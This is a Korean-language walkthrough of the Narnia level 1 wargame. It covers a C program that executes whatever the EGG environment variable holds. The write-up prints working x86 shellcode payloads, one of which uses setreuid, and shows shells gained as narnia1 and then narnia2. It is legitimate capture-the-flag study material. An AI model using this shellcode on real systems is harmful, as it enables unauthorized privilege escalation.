## 1. 문제 확인
- ID : narnia1
- Target : /narnia/narnia1
- Flag : /etc/narnia_pass/narnia2
```
narnia1@gibson:/narnia$ ./narnia1
Give me something to execute at the env-variable EGG
narnia1@gibson:/narnia$
```

<br/><br/>
## 2. 취약점 분석
### 2.1 Source Code
- 환경변수 EGG의 값을 읽어와서 ret변수에 저장하고, ret()를 호출하여 ret 포인터의 값을 실행함
```c
#include <stdio.h>

int main(){
    int (*ret)();

    if(getenv("EGG")==NULL){
        printf("Give me something to execute at the env-variable EGG\n");
        exit(1);
    }

    printf("Trying to execute EGG!\n");
    ret = getenv("EGG");
    ret();

    return 0;
}
```
### 2.2 Code 분석
- 환경변수 EGG에 쉘코드를 넣어주면 쉘을 띄울 수 있음
```
	$ export EGG=<쉘코드>
```

<br/><br/>
## 3. Exploit
- EGG 환경변수에 /bin/sh 쉘코드를 넣어주고 프로그램을 실행하면 narnia1 권한으로 쉘이 뜸
```
	narnia1@gibson:/narnia$ export EGG=`echo -e "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"`
	narnia1@gibson:/narnia$ ./narnia1
	Trying to execute EGG!
	$ id
	uid=14001(narnia1) gid=14001(narnia1) groups=14001(narnia1)
```
- setreuid 가 포함된 쉘코드로 바꿔 넣어주고 프로그램을 실행하면 narnia2 권한의 쉘이 뜸
```
	narnia1@gibson:/narnia$ export EGG=`echo -e "\x6a\x31\x58\xcd\x80\x89\xc3\x6a\x46\x58\x89\xd9\xcd\x80\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x68\x01\x01\x01\x01\x81\x34\x24\x72\x69\x01\x01\x31\xc9\x51\x6a\x04\x59\x01\xe1\x51\x89\xe1\x31\xd2\x6a\x0b\x58\xcd\x80"`
	narnia1@gibson:/narnia$ ./narnia1
	Trying to execute EGG!
	$ id
	uid=14002(narnia2) gid=14001(narnia1) groups=14001(narnia1)
	$
```
